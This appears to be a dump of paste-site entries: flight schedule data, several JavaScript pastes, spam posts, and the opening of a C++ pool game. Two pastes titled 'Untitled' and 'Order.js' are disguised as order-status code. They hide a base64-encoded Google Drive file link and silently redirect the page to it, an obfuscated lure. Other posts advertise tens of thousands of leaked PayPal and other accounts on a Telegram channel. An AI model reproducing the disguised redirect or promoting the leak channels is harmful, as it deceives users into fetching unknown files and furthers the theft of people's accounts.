    Vuelo(""TW"", 457, ""TPA"", 7, 0, ""DEN"", 10, 50, 1),
    Vuelo(""TW"", 651, ""STL"", 15, 7, ""MSY"", 16, 59, 0),
    Vuelo(""TW"", 628, ""BNA"", 7, 0, ""STL"", 11, 0, 0),
    Vuelo(""TW"", 648, ""STL"", 10, 30, ""DTW"", 12, 59, 0),
    Vuelo(""TW"", 53, ""STL"", 15, 16, ""SEA"", 17, 57, 0),
    Vuelo(""TW"", 703, ""JFK"", 16, 30, ""STL"", 10, 27, 1),
    Vuelo(""TW"", 551, ""STL"", 11, 57, ""DFW"", 13, 52, 0),
    Vuelo(""TW"", 634, ""JFK"", 21, 5, ""BOS"", 12, 9, 0),
    Vuelo(""TW"", 53, ""BOS"", 12, 3, ""SEA"", 17, 57, 1),
    Vuelo(""TW"", 539, ""STL"", 8, 17, ""MSY"", 10, 9, 0),
    Vuelo(""TW"", 152, ""SFO"", 6, 40, ""STL"", 12, 18, 0),
    Vuelo(""TW"", 202, ""MSP"", 11, 37, ""JFK"", 16, 50, 1),
    Vuelo(""TW"", 492, ""STL"", 16, 58, ""MIA"", 10, 38, 0),
    Vuelo(""TW"", 445, ""STL"", 21, 21, ""DFW"", 13, 15, 0),
    Vuelo(""TW"", 171, ""STL"", 21, 27, ""LAX"", 13, 29, 0),
    Vuelo(""TW"", 516, ""STL"", 13, 21, ""MSP"", 15, 1, 0),
    Vuelo(""TW"", 496, ""STL"", 10, 30, ""MIA"", 14, 9, 0),
    Vuelo(""TW"", 263, ""STL"", 15, 24, ""DEN"", 17, 0, 0),
    Vuelo(""TW"", 196, ""STL"", 7, 41, ""BOS"", 11, 9, 0),
    Vuelo(""TW"", 25, ""JFK"", 11, 5, ""STL"", 14, 17, 1),
    Vuelo(""TW"", 339, ""ORD"", 16, 5, ""STL"", 17, 19, 0),
    Vuelo(""TW"", 343, ""STL"", 16, 11, ""HOU"", 18, 24, 0),
    Vuelo(""TW"", 574, ""STL"", 17, 9, ""ORD"", 18, 26, 0),
    Vuelo(""TW"", 234, ""STL"", 15, 21, ""ORD"", 16, 35, 0),
    Vuelo(""TW"", 598, ""HOU"", 10, 30, ""RDU"", 16, 6, 1),
    Vuelo(""TW"", 621, ""ATL"", 13, 39, ""DFW"", 17, 1, 1),
    Vuelo(""TW"", 123, ""DCA"", 9, 43, ""STL"", 11, 12, 0),
    Vuelo(""TW"", 326, ""SEA"", 6, 44, ""ORD"", 14, 48, 1),
    Vuelo(""TW"", 71, ""BOS"", 15, 20, ""STL"", 17, 34, 0),
    Vuelo(""TW"", 246, ""STL"", 13, 30, ""MIA"", 17, 13, 0),
    Vuelo(""TW"", 169, ""STL"", 9, 2, ""PHX"", 11, 23, 0),
    Vuelo(""TW"", 634, ""STL"", 16, 49, ""JFK"", 10, 21, 0),
    Vuelo(""TW"", 843, ""JFK"", 18, 20, ""SFO"", 11, 48, 0),
    Vuelo(""TW"", 492, ""LAX"", 7, 45, ""SFO"", 10, 7, 0),
    Vuelo(""TW"", 306, ""HOU"", 14, 25, ""STL"", 16, 19, 0),
    Vuelo(""TW"", 534, ""STL"", 16, 49, ""ATL"", 19, 26, 0),
    Vuelo(""TW"", 873, ""JFK"", 17, 35, ""DCA"", 19, 3, 0),
    Vuelo(""TW"", 118, ""DEN"", 13, 0, ""STL"", 16, 4, 0),
    Vuelo(""TW"", 240, ""DEN"", 16, 19, ""STL"", 19, 27, 0),
    Vuelo(""TW"", 97, ""JFK"", 14, 14, ""PHL"", 15, 4, 0),
    Vuelo(""TW"", 157, ""MIA"", 18, 30, ""STL"", 10, 24, 0),
    Vuelo(""TW"", 61, ""BOS"", 18, 30, ""SFO"", 12, 10, 0),
    Vuelo(""TW"", 712, ""PHL"", 14, 36, ""JFK"", 15, 26, 0),
    Vuelo(""TW"", 598, ""HOU"", 10, 30, ""STL"", 12, 30, 0),
    Vuelo(""TW"", 487, ""DFW"", 15, 54, ""STL"", 17, 37, 0),
    Vuelo(""TW"", 824, ""PHX"", 9, 41, ""STL"", 13, 35, 0),
    Vuelo(""TW"", 73, ""ATL"", 7, 42, ""STL"", 12, 7, 0),
    Vuelo(""TW"", 367, ""ORD"", 18, 0, ""STL"", 19, 20, 0),
    Vuelo(""TW"", 5, ""JFK"", 18, 30, ""MIA"", 11, 41, 0),
    Vuelo(""TW"", 450, ""DEN"", 8, 55, ""STL"", 12, 3, 0),
    Vuelo(""TW"", 90, ""LAX"", 8, 35, ""STL"", 14, 7, 0),
    Vuelo(""TW"", 402, ""DEN"", 7, 0, ""STL"", 10, 0, 0),
    Vuelo(""TW"", 223, ""BOS"", 6, 0, ""SFO"", 11, 39, 1),
    Vuelo(""TW"", 245, ""MIA"", 7, 20, ""STL"", 11, 18, 2),
    Vuelo(""TW"", 505, ""RDU"", 16, 34, ""STL"", 17, 54, 0),
    Vuelo(""TW"", 10, ""STL"", 17, 5, ""JFK"", 11, 38, 1),
    Vuelo(""TW"", 574, ""MSY"", 14, 27, ""STL"", 16, 15, 0),
    Vuelo(""TW"", 556, ""MSY"", 8, 4, ""STL"", 15, 0, 0),
    Vuelo(""TW"", 552, ""STL"", 13, 33, ""BNA"", 14, 50, 0),
    Vuelo(""TW"", 845, ""STL"", 18, 40, ""ABQ"", 10, 25, 0),
    Vuelo(""TW"", 518, ""STL"", 10, 30, ""ATL"", 13, 6, 0),
    Vuelo(""TW"", 443, ""STL"", 9, 2, ""LAX"", 11, 9, 0),
    Vuelo(""TW"", 842, ""SFO"", 8, 0, ""JFK"", 16, 20, 0),
    Vuelo(""TW"", 563, ""DFW"", 6, 41, ""STL"", 12, 7, 0),
    Vuelo(""TW"", 19, ""STL"", 18, 36, ""DEN"", 10, 7, 0),
    Vuelo(""TW"", 57, ""STL"", 18, 38, ""PHX"", 11, 1, 0),
    Vuelo(""TW"", 375, ""STL"", 18, 24, ""SEA"", 11, 1, 0),
    Vuelo(""TW"", 608, ""MSY"", 17, 36, ""STL"", 19, 27, 0),
    Vuelo(""TW"", 169, ""DTW"", 7, 35, ""STL"", 11, 2, 0),
    Vuelo(""TW"", 385, ""STL"", 19, 2, ""MSY"", 11, 1, 0),
    Vuelo(""TW"", 410, ""STL"", 10, 35, ""DCA"", 13, 32, 0),
    Vuelo(""TW"", 260, ""PHX"", 15, 10, ""STL"", 19, 9, 0),
    Vuelo(""TW"", 703, ""DCA"", 18, 59, ""STL"", 10, 27, 0),
    Vuelo(""TW"", 150, ""STL"", 17, 3, ""BOS"", 10, 46, 0),
    Vuelo(""TW"", 280, ""STL"", 18, 4, ""DCA"", 11, 0, 0),
    Vuelo(""TW"", 634, ""STL"", 16, 49, ""BOS"", 12, 9, 1),
    Vuelo(""TW"", 391, ""BOS"", 9, 20, ""DCA"", 12, 30, 1),
    Vuelo(""TW"", 657, ""STL"", 18, 28, ""DFW"", 10, 27, 0),
    Vuelo(""TW"", 639, ""STL"", 18, 24, ""HOU"", 10, 46, 0),
    Vuelo(""TW"", 721, ""STL"", 18, 50, ""LAX"", 10, 54, 0),
    Vuelo(""TW"", 31, ""BOS"", 9, 4, ""STL"", 11, 17, 0),
    Vuelo(""TW"", 694, ""STL"", 7, 39, ""RDU"", 10, 29, 0),
    Vuelo(""TW"", 204, ""STL"", 16, 49, ""MIA"", 12, 34, 2),
    Vuelo(""TW"", 108, ""STL"", 17, 32, ""PHL"", 10, 46, 0),
    Vuelo(""TW"", 430, ""STL"", 7, 45, ""PHL"", 10, 44, 0),
    Vuelo(""TW"", 743, ""BOS"", 15, 35, ""DEN"", 10, 39, 1),
    Vuelo(""TW"", 88, ""ABQ"", 15, 28, ""STL"", 18, 51, 0),
    Vuelo(""TW"", 674, ""DFW"", 14, 30, ""STL"", 16, 13, 0),
    Vuelo(""TW"", 227, ""MSP"", 14, 15, ""STL"", 15, 47, 0),
    Vuelo(""TW"", 336, ""STL"", 20, 8, ""MIA"", 12, 47, 1),
    Vuelo(""TW"", 701, ""JFK"", 18, 10, ""SEA"", 11, 20, 0),
    Vuelo(""TW"", 169, ""DTW"", 7, 35, ""PHX"", 11, 23, 1),
    Vuelo(""TW"", 815, ""JFK"", 16, 15, ""LAX"", 19, 22, 0),
    Vuelo(""TW"", 608, ""MSY"", 17, 36, ""RDU"", 13, 14, 1),
    Vuelo(""TW"", 80, ""SEA"", 1, 12, ""DCA"", 10, 40, 1),
    Vuelo(""TW"", 395, ""DTW"", 16, 56, ""STL"", 17, 42, 0),
    Vuelo(""TW"", 537, ""DCA"", 17, 29, ""STL"", 19, 2, 0),
    Vuelo(""UA"", 239, ""PHL"", 17, 30, ""DEN"", 19, 39, 0),
    Vuelo(""UA"", 229, ""ORD"", 22, 0, ""DEN"", 13, 36, 0),
    Vuelo(""UA"", 41, ""PHL"", 17, 50, ""LAX"", 10, 47, 0),
    Vuelo(""UA"", 246, ""DEN"", 15, 45, ""ORD"", 19, 3, 0),
    Vuelo(""UA"", 256, ""ORD"", 14, 0, ""BNA"", 15, 30, 0),
    Vuelo(""UA"", 497, ""DEN"", 14, 52, ""LAX"", 16, 14, 0),
    Vuelo(""UA"", 577, ""DFW"", 18, 46, ""DEN"", 19, 48, 0),
    Vuelo(""UA"", 156, ""SEA"", 18, 30, ""ORD"", 12, 13, 0),
    Vuelo(""UA"", 288, ""STL"", 9, 10, ""ORD"", 10, 24, 0),
    Vuelo(""UA"", 112, ""SEA"", 8, 30, ""LAX"", 11, 0, 0),
    Vuelo(""UA"", 717, ""ATL"", 6, 40, ""DEN"", 10, 4, 0),
    Vuelo(""UA"", 15, ""JFK"", 18, 20, ""LAX"", 11, 38, 0),
    Vuelo(""UA"", 646, ""LAX"", 18, 5, ""DEN"", 11, 19, 0),
    Vuelo(""UA"", 785, ""ABQ"", 6, 45, ""DEN"", 15, 7, 0),
    Vuelo(""UA"", 189, ""PHL"", 10, 30, ""ORD"", 11, 40, 0),
    Vuelo(""UA"", 708, ""LAX"", 8, 0, ""ORD"", 14, 1, 0),
    Vuelo(""UA"", 150, ""ORD"", 15, 14, ""JFK"", 18, 22, 0),
    Vuelo(""UA"", 450, ""DEN"", 15, 9, ""DFW"", 18, 6, 0),
    Vuelo(""UA"", 769, ""TPA"", 19, 49, ""ORD"", 11, 31, 0),
    Vuelo(""UA"", 416, ""ORD"", 8, 10, ""ATL"", 11, 8, 0),
    Vuelo(""UA"", 230, ""DEN"", 9, 21, ""ORD"", 12, 45, 0),
    Vuelo(""UA"", 288, ""STL"", 9, 10, ""PHL"", 13, 59, 1),
    Vuelo(""UA"", 998, ""ORD"", 6, 30, ""DTW"", 14, 4, 0),
    Vuelo(""UA"", 205, ""ORD"", 15, 15, ""DEN"", 16, 52, 0),
    Vuelo(""UA"", 455, ""DEN"", 11, 57, ""SEA"", 13, 44, 0),
    Vuelo(""UA"", 576, ""MSY"", 18, 55, ""ORD"", 11, 14, 0),
    Vuelo(""UA"", 288, ""ORD"", 11, 10, ""PHL"", 13, 59, 0),
    Vuelo(""UA"", 815, ""ORD"", 18, 0, ""LAX"", 10, 21, 0),
    Vuelo(""UA"", 620, ""SEA"", 9, 55, ""ORD"", 15, 31, 0),
    Vuelo(""UA"", 216, ""DEN"", 6, 45, ""DFW"", 13, 3, 0),
    Vuelo(""UA"", 844, ""SFO"", 11, 0, ""LAX"", 12, 20, 0),
    Vuelo(""UA"", 627, ""DCA"", 19, 0, ""ORD"", 10, 15, 0),
    Vuelo(""UA"", 937, ""LAX"", 15, 0, ""SFO"", 16, 22, 0),
    Vuelo(""UA"", 600, ""ORD"", 6, 20, ""DCA"", 10, 0, 0),
    Vuelo(""UA"", 205, ""PHL"", 13, 5, ""DEN"", 16, 52, 1),
    Vuelo(""UA"", 740, ""DEN"", 18, 33, ""ATL"", 13, 23, 0),
    Vuelo(""UA"", 861, ""BOS"", 17, 16, ""DEN"", 19, 55, 0),
    Vuelo(""UA"", 715, ""ORD"", 12, 14, ""STL"", 13, 29, 0),
    Vuelo(""UA"", 114, ""ORD"", 17, 5, ""PHL"", 10, 2, 0),
    Vuelo(""UA"", 39, ""PHL"", 6, 10, ""ORD"", 11, 9, 0),
    Vuelo(""UA"", 135, ""DTW"", 17, 20, ""SFO"", 11, 28, 1),
    Vuelo(""UA"", 657, ""ORD"", 22, 0, ""SEA"", 12, 34, 0),
    Vuelo(""UA"", 422, ""LAX"", 8, 5, ""DEN"", 11, 31, 0),
    Vuelo(""UA"", 353, ""ORD"", 7, 55, ""MSP"", 11, 9, 0),
    Vuelo(""UA"", 238, ""LAX"", 14, 40, ""DEN"", 17, 52, 0),
    Vuelo(""UA"", 523, ""ORD"", 12, 24, ""DFW"", 14, 55, 0),
    Vuelo(""UA"", 141, ""ORD"", 16, 55, ""SFO"", 19, 32, 0),
    Vuelo(""UA"", 992, ""MSP"", 15, 0, ""ORD"", 16, 21, 0),
    Vuelo(""UA"", 117, ""ORD"", 22, 0, ""LAX"", 12, 27, 0),
    Vuelo(""UA"", 155, ""ORD"", 15, 30, ""SEA"", 17, 51, 0),
    Vuelo(""UA"", 89, ""ORD"", 9, 31, ""DEN"", 11, 11, 0),
    Vuelo(""UA"", 220, ""DEN"", 7, 5, ""ORD"", 10, 17, 0),
    Vuelo(""UA"", 223, ""DTW"", 7, 10, ""ORD"", 12, 2, 0),
    Vuelo(""UA"", 409, ""PHL"", 7, 42, ""ORD"", 15, 6, 0),
    Vuelo(""UA"", 877, ""ORD"", 18, 55, ""DFW"", 11, 21, 0),
    Vuelo(""UA"", 466, ""DEN"", 15, 0, ""ABQ"", 16, 14, 0),
    Vuelo(""UA"", 941, ""ORD"", 15, 14, ""DEN"", 16, 46, 0),
    Vuelo(""UA"", 245, ""DEN"", 17, 35, ""ABQ"", 18, 44, 0),
    Vuelo(""UA"", 487, ""PHL"", 17, 0, ""DEN"", 10, 47, 1),
    Vuelo(""UA"", 147, ""PHL"", 8, 50, ""DEN"", 10, 58, 0),
    Vuelo(""UA"", 496, ""DEN"", 18, 45, ""DTW"", 13, 28, 0),
    Vuelo(""UA"", 568, ""ORD"", 8, 10, ""DTW"", 10, 20, 0),
    Vuelo(""UA"", 567, ""DTW"", 14, 2, ""ORD"", 14, 15, 0),
    Vuelo(""UA"", 437, ""BOS"", 8, 40, ""ORD"", 10, 28, 0),
    Vuelo(""UA"", 28, ""LAX"", 21, 55, ""JFK"", 14, 9, 0),
    Vuelo(""UA"", 480, ""MSY"", 8, 0, ""ORD"", 10, 17, 0),
    Vuelo(""UA"", 678, ""ORD"", 18, 30, ""BOS"", 11, 47, 0),
    Vuelo(""UA"", 93, ""BOS"", 17, 30, ""SFO"", 11, 14, 0),
    Vuelo(""UA"", 255, ""MIA"", 7, 25, ""DEN"", 11, 1, 1),
    Vuelo(""UA"", 809, ""LAX"", 9, 30, ""SFO"", 10, 57, 0),
    Vuelo(""UA"", 226, ""DEN"", 9, 20, ""ORD"", 12, 38, 0),
    Vuelo(""UA"", 807, ""ORD"", 9, 35, ""SFO"", 12, 10, 0),
    Vuelo(""UA"", 854, ""DEN"", 10, 46, ""STL"", 13, 46, 0),
    Vuelo(""UA"", 625, ""DCA"", 18, 0, ""MSP"", 11, 8, 1),
    Vuelo(""UA"", 308, ""ORD"", 6, 20, ""PVD"", 12, 7, 0),
    Vuelo(""UA"", 840, ""STL"", 11, 45, ""ORD"", 12, 54, 0),
    Vuelo(""UA"", 183, ""PHL"", 8, 30, ""SFO"", 11, 29, 0),
    Vuelo(""UA"", 903, ""JFK"", 19, 25, ""ORD"", 11, 3, 0),
    Vuelo(""UA"", 625, ""ORD"", 19, 55, ""MSP"", 11, 8, 0),
    Vuelo(""UA"", 719, ""ORD"", 22, 0, ""SFO"", 12, 43, 0),
    Vuelo(""UA"", 122, ""SFO"", 11, 0, ""ORD"", 16, 53, 0),
    Vuelo(""UA"", 18, ""SFO"", 13, 20, ""JFK"", 11, 42, 0),
    Vuelo(""UA"", 461, ""DTW"", 11, 10, ""SEA"", 14, 33, 1),
    Vuelo(""UA"", 718, ""ABQ"", 10, 20, ""DEN"", 11, 32, 0),
    Vuelo(""UA"", 461, ""DTW"", 11, 10, ""ORD"", 11, 20, 0),
    Vuelo(""UA"", 363, ""MSY"", 7, 34, ""SFO"", 10, 29, 0),
    Vuelo(""UA"", 954, ""ORD"", 16, 50, ""ATL"", 19, 43, 0),
    Vuelo(""UA"", 169, ""DEN"", 12, 15, ""LAX"", 13, 36, 0),
    Vuelo(""UA"", 476, ""DEN"", 18, 37, ""STL"", 11, 33, 0),
    Vuelo(""UA"", 134, ""SFO"", 6, 50, ""ORD"", 12, 51, 0),
    Vuelo(""UA"", 669, ""ORD"", 9, 45, ""SFO"", 12, 20, 0),
    Vuelo(""UA"", 615, ""DCA"", 13, 0, ""ORD"", 14, 1, 0),
    Vuelo(""UA"", 794, ""DEN"", 10, 31, ""DFW"", 13, 15, 0),
    Vuelo(""UA"", 340, ""ORD"", 7, 55, ""BOS"", 11, 5, 0),
    Vuelo(""UA"", 427, ""DEN"", 15, 25, ""SEA"", 17, 20, 0),
    Vuelo(""UA"", 319, ""DEN"", 9, 30, ""SEA"", 11, 28, 0),
    Vuelo(""UA"", 805, ""LAX"", 10, 30, ""SFO"", 11, 55, 0),
    Vuelo(""UA"", 343, ""DEN"", 11, 49, ""SFO"", 13, 30, 0),
    Vuelo(""UA"", 121, ""ORD"", 12, 46, ""SFO"", 15, 21, 0),
    Vuelo(""UA"", 612, ""ORD"", 12, 20, ""DCA"", 14, 56, 0),
    Vuelo(""UA"", 730, ""DEN"", 12, 31, ""ORD"", 15, 50, 0),
    Vuelo(""UA"", 399, ""ORD"", 7, 53, ""DFW"", 10, 15, 0),
    Vuelo(""UA"", 487, ""ORD"", 19, 15, ""DEN"", 10, 47, 0),
    Vuelo(""UA"", 359, ""ORD"", 9, 52, ""DFW"", 12, 26, 0),
    Vuelo(""UA"", 152, ""LAX"", 12, 0, ""ORD"", 17, 56, 0),
    Vuelo(""UA"", 457, ""ORD"", 17, 30, ""SEA"", 19, 50, 0),
    Vuelo(""UA"", 699, ""BOS"", 14, 25, ""DTW"", 18, 9, 1),
    Vuelo(""UA"", 478, ""SFO"", 12, 43, ""DFW"", 18, 15, 0),
    Vuelo(""UA"", 442, ""ORD"", 6, 35, ""RDU"", 12, 5, 0),
    Vuelo(""UA"", 365, ""BNA"", 16, 20, ""ORD"", 18, 0, 0),
    Vuelo(""UA"", 971, ""ORD"", 9, 47, ""HOU"", 12, 34, 0),
    Vuelo(""UA"", 390, ""ORD"", 16, 44, ""MIA"", 10, 39, 0),
    Vuelo(""UA"", 196, ""STL"", 15, 3, ""ORD"", 16, 15, 0),
    Vuelo(""UA"", 419, ""DEN"", 11, 55, ""PHX"", 13, 44, 0),
    Vuelo(""UA"", 317, ""HOU"", 6, 39, ""DEN"", 11, 0, 0),
    Vuelo(""UA"", 39, ""ORD"", 8, 15, ""LAX"", 10, 32, 0),
    Vuelo(""UA"", 76, ""MSY"", 10, 47, ""ORD"", 13, 1, 0),
    Vuelo(""UA"", 48, ""LAX"", 7, 45, ""PHL"", 15, 39, 0),
    Vuelo(""UA"", 56, ""SEA"", 13, 0, ""BOS"", 13, 0, 1),
    Vuelo(""UA"", 415, ""ATL"", 17, 12, ""ORD"", 18, 14, 0),
    Vuelo(""UA"", 936, ""SFO"", 9, 0, ""LAX"", 10, 20, 0),
    Vuelo(""UA"", 890, ""LAX"", 14, 10, ""BOS"", 12, 29, 0),
    Vuelo(""UA"", 154, ""SEA"", 7, 5, ""ORD"", 12, 45, 0),
    Vuelo(""UA"", 230, ""DEN"", 9, 21, ""MIA"", 18, 4, 1),
    Vuelo(""UA"", 155, ""BOS"", 12, 40, ""SEA"", 17, 51, 1),
    Vuelo(""UA"", 806, ""SFO"", 11, 30, ""LAX"", 12, 46, 0),
    Vuelo(""UA"", 539, ""DEN"", 18, 15, ""LAX"", 19, 37, 0),
    Vuelo(""UA"", 247, ""DEN"", 13, 50, ""SFO"", 15, 16, 0),
    Vuelo(""UA"", 354, ""LAX"", 11, 22, ""BOS"", 11, 18, 1),
    Vuelo(""UA"", 25, ""JFK"", 10, 0, ""SFO"", 13, 27, 0),
    Vuelo(""UA"", 622, ""PHX"", 12, 2, ""DCA"", 10, 8, 1),
    Vuelo(""UA"", 177, ""TPA"", 12, 55, ""SEA"", 17, 51, 1),
    Vuelo(""UA"", 217, ""ORD"", 17, 55, ""MSP"", 19, 17, 0),
    Vuelo(""UA"", 394, ""ORD"", 7, 44, ""MIA"", 11, 42, 0),
    Vuelo(""UA"", 270, ""DEN"", 10, 38, ""PHL"", 15, 56, 0),
    Vuelo(""UA"", 859, ""ORD"", 13, 55, ""MSP"", 15, 19, 0),
    Vuelo(""UA"", 378, ""SFO"", 13, 45, ""MIA"", 12, 9, 0),
    Vuelo(""UA"", 664, ""DEN"", 18, 33, ""DFW"", 11, 24, 0),
    Vuelo(""UA"", 861, ""BOS"", 17, 16, ""SFO"", 12, 22, 1)
  )

"
1MfNtFBw,Untitled,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 10:39:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61391/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KWmFHutE,PayPal with Balance,kammex,JavaScript,Monday 28th of April 2025 10:36:24 PM CDT,63167 Accounts Posted On https://t.me/leakzbyeminem
2yJWCvbP,Products.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 10:24:14 PM CDT,
D5TGskfN,Leaked Accounts - Fresh Hits,kammex,JavaScript,Monday 28th of April 2025 10:21:02 PM CDT,20161 Accounts Posted On https://t.me/leakzbyeminem
AyXav4Zi,Order.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 10:08:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71934/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aweQ40qa,Chaturbate with Tokens,kammex,JavaScript,Monday 28th of April 2025 10:05:41 PM CDT,50977 Accounts Posted On https://t.me/leakzbyeminem
aBJQrxAD,Direct2D 8-Ball Pool Using Vector Graphics: Ultimate Final Edition (Yahoo-Style ShotMeter TableFrame,alien_fx_fiend,C++,Monday 28th of April 2025 09:53:52 PM CDT,"Follow Project On Github::: https://github.com/alienfxfiend/Prelude-in-C/tree/main/Yahoo-8Ball-Pool-Clone

==++ Here's the full source for (file 1/3 (No OOP-based)) ""Pool-Game-Clone.cpp""::: ++==
```Pool-Game-Clone.cpp
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <d2d1.h>
#include <dwrite.h>
#include <vector>
#include <cmath>
#include <string>
#include <sstream> // Required for wostringstream
#include <algorithm> // Required for std::max, std::min
#include <ctime>    // Required for srand, time
#include <cstdlib> // Required for srand, rand (often included by others, but good practice)
#include <commctrl.h> // Needed for radio buttons etc. in dialog (if using native controls)
#include <mmsystem.h> // For PlaySound
#include <thread>
#include ""resource.h""

#pragma comment(lib, ""Comctl32.lib"") // Link against common controls library
#pragma comment(lib, ""d2d1.lib"")
#pragma comment(lib, ""dwrite.lib"")
#pragma comment(lib, ""Winmm.lib"") // Link against Windows Multimedia library

// --- Constants ---
const float PI = 3.1415926535f;
const float BALL_RADIUS = 10.0f;
const float TABLE_LEFT = 100.0f;
const float TABLE_TOP = 100.0f;
const float TABLE_WIDTH = 700.0f;
const float TABLE_HEIGHT = 350.0f;
const float TABLE_RIGHT = TABLE_LEFT + TABLE_WIDTH;
const float TABLE_BOTTOM = TABLE_TOP + TABLE_HEIGHT;
const float CUSHION_THICKNESS = 20.0f;
const float HOLE_VISUAL_RADIUS = 22.0f; // Visual size of the hole
const float POCKET_RADIUS = HOLE_VISUAL_RADIUS * 1.05f; // Make detection radius slightly larger // Make detection radius match visual size (or slightly larger)
const float MAX_SHOT_POWER = 15.0f;
const float FRICTION = 0.985f; // Friction factor per frame
const float MIN_VELOCITY_SQ = 0.01f * 0.01f; // Stop balls below this squared velocity
const float HEADSTRING_X = TABLE_LEFT + TABLE_WIDTH * 0.30f; // 30% line
const float RACK_POS_X = TABLE_LEFT + TABLE_WIDTH * 0.65f; // 65% line for rack apex
const float RACK_POS_Y = TABLE_TOP + TABLE_HEIGHT / 2.0f;
const UINT ID_TIMER = 1;
const int TARGET_FPS = 60; // Target frames per second for timer

// --- Enums ---
// --- MODIFIED/NEW Enums ---
enum GameState {
    SHOWING_DIALOG,     // NEW: Game is waiting for initial dialog input
    PRE_BREAK_PLACEMENT,// Player placing cue ball for break
    BREAKING,           // Player is aiming/shooting the break shot
    AIMING,             // Player is aiming
    AI_THINKING,        // NEW: AI is calculating its move
    SHOT_IN_PROGRESS,   // Balls are moving
    ASSIGNING_BALLS,    // Turn after break where ball types are assigned
    PLAYER1_TURN,
    PLAYER2_TURN,
    BALL_IN_HAND_P1,
    BALL_IN_HAND_P2,
    GAME_OVER
};

enum BallType {
    NONE,
    SOLID,  // Yellow (1-7)
    STRIPE, // Red (9-15)
    EIGHT_BALL, // Black (8)
    CUE_BALL // White (0)
};

// NEW Enums for Game Mode and AI Difficulty
enum GameMode {
    HUMAN_VS_HUMAN,
    HUMAN_VS_AI
};

enum AIDifficulty {
    EASY,
    MEDIUM,
    HARD
};

// --- Structs ---
struct Ball {
    int id;             // 0=Cue, 1-7=Solid, 8=Eight, 9-15=Stripe
    BallType type;
    float x, y;
    float vx, vy;
    D2D1_COLOR_F color;
    bool isPocketed;
};

struct PlayerInfo {
    BallType assignedType;
    int ballsPocketedCount;
    std::wstring name;
};

// --- Global Variables ---

// Direct2D & DirectWrite
ID2D1Factory* pFactory = nullptr;
ID2D1HwndRenderTarget* pRenderTarget = nullptr;
IDWriteFactory* pDWriteFactory = nullptr;
IDWriteTextFormat* pTextFormat = nullptr;
IDWriteTextFormat* pLargeTextFormat = nullptr; // For ""Foul!""

// Game State
HWND hwndMain = nullptr;
GameState currentGameState = SHOWING_DIALOG; // Start by showing dialog
std::vector<Ball> balls;
int currentPlayer = 1; // 1 or 2
PlayerInfo player1Info = { BallType::NONE, 0, L""Player 1"" };
PlayerInfo player2Info = { BallType::NONE, 0, L""CPU"" }; // Default P2 name
bool foulCommitted = false;
std::wstring gameOverMessage = L"""";
bool firstBallPocketedAfterBreak = false;
std::vector<int> pocketedThisTurn;
// --- NEW: Foul Tracking Globals ---
int firstHitBallIdThisShot = -1;      // ID of the first object ball hit by cue ball (-1 if none)
bool cueHitObjectBallThisShot = false; // Did cue ball hit an object ball this shot?
bool railHitAfterContact = false;     // Did any ball hit a rail AFTER cue hit an object ball?
// --- End New Foul Tracking Globals ---

// NEW Game Mode/AI Globals
GameMode gameMode = HUMAN_VS_HUMAN; // Default mode
AIDifficulty aiDifficulty = MEDIUM; // Default difficulty
bool isPlayer2AI = false;           // Is Player 2 controlled by AI?
bool aiTurnPending = false;         // Flag: AI needs to take its turn when possible
// bool aiIsThinking = false;       // Replaced by AI_THINKING game state

// Input & Aiming
POINT ptMouse = { 0, 0 };
bool isAiming = false;
bool isDraggingCueBall = false;
// --- ENSURE THIS LINE EXISTS HERE ---
bool isDraggingStick = false; // True specifically when drag initiated on the stick graphic
// --- End Ensure ---
bool isSettingEnglish = false;
D2D1_POINT_2F aimStartPoint = { 0, 0 };
float cueAngle = 0.0f;
float shotPower = 0.0f;
float cueSpinX = 0.0f; // Range -1 to 1
float cueSpinY = 0.0f; // Range -1 to 1
float pocketFlashTimer = 0.0f;
bool cheatModeEnabled = false; // Cheat Mode toggle (G key)
int draggingBallId = -1;
bool keyboardAimingActive = false; // NEW FLAG: true when arrow keys modify aim/power

// UI Element Positions
D2D1_RECT_F powerMeterRect = { TABLE_RIGHT + CUSHION_THICKNESS + 10, TABLE_TOP, TABLE_RIGHT + CUSHION_THICKNESS + 40, TABLE_BOTTOM };
